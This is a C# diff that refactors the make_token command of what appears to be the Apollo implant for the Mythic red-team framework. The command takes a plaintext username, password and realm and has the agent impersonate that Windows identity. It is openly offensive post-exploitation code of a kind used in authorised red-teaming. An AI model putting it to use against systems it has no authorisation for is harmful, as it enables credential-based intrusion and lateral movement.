@@ -31,47 +31,48 @@ namespace Tasks
         public make_token(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
         {
         }
-
-        public override ST.Task CreateTasking()
+        public override void Start()
         {
-            return new ST.Task(() =>
+            TaskResponse resp;
+            MakeTokenParameters parameters = _jsonSerializer.Deserialize<MakeTokenParameters>(_data.Parameters);
+            if (string.IsNullOrEmpty(parameters.Credential.Account))
             {
-                TaskResponse resp;
-                MakeTokenParameters parameters = _jsonSerializer.Deserialize<MakeTokenParameters>(_data.Parameters);
-                if (string.IsNullOrEmpty(parameters.Credential.Account))
+                resp = CreateTaskResponse("Account name is empty.", true, "error");
+            }
+            else if (string.IsNullOrEmpty(parameters.Credential.CredentialMaterial))
+            {
+                resp = CreateTaskResponse("Password is empty.", true, "error");
+            }
+            else if (parameters.Credential.CredentialType != "plaintext")
+            {
+                resp = CreateTaskResponse("Credential material is not a plaintext password.", true, "error");
+            }
+            else
+            {
+                ApolloLogonInformation info = new ApolloLogonInformation(
+                    parameters.Credential.Account,
+                    parameters.Credential.CredentialMaterial,
+                    parameters.Credential.Realm);
+                if (_agent.GetIdentityManager().SetIdentity(info))
                 {
-                    resp = CreateTaskResponse("Account name is empty.", true, "error");
-                } else if (string.IsNullOrEmpty(parameters.Credential.CredentialMaterial))
-                {
-                    resp = CreateTaskResponse("Password is empty.", true, "error");
-                } else if (parameters.Credential.CredentialType != "plaintext")
-                {
-                    resp = CreateTaskResponse("Credential material is not a plaintext password.", true, "error");
-                } else
-                {
-                    ApolloLogonInformation info = new ApolloLogonInformation(
-                        parameters.Credential.Account,
-                        parameters.Credential.CredentialMaterial,
-                        parameters.Credential.Realm);
-                    if (_agent.GetIdentityManager().SetIdentity(info))
-                    {
-                        var cur = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();
-                        resp = CreateTaskResponse(
-                            $"Successfully impersonated {cur.Name}",
-                            true,
-                            "completed",
-                            new IMythicMessage[] { Artifact.PlaintextLogon(cur.Name, true)});
-                    } else
-                    {
-                        resp = CreateTaskResponse(
-                            $"Failed to impersonate {info.Username}: {Marshal.GetLastWin32Error()}",
-                            true,
-                            "error",
-                            new IMythicMessage[] { Artifact.PlaintextLogon(info.Username) });
-                    }
+                    var cur = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();
+                    resp = CreateTaskResponse(
+                        $"Successfully impersonated {cur.Name}",
+                        true,
+                        "completed",
+                        new IMythicMessage[] {Artifact.PlaintextLogon(cur.Name, true)});
                 }
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-            }, _cancellationToken.Token);
+                else
+                {
+                    resp = CreateTaskResponse(
+                        $"Failed to impersonate {info.Username}: {Marshal.GetLastWin32Error()}",
+                        true,
+                        "error",
+                        new IMythicMessage[] {Artifact.PlaintextLogon(info.Username)});
+                }
+            }
+
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
     }
 }
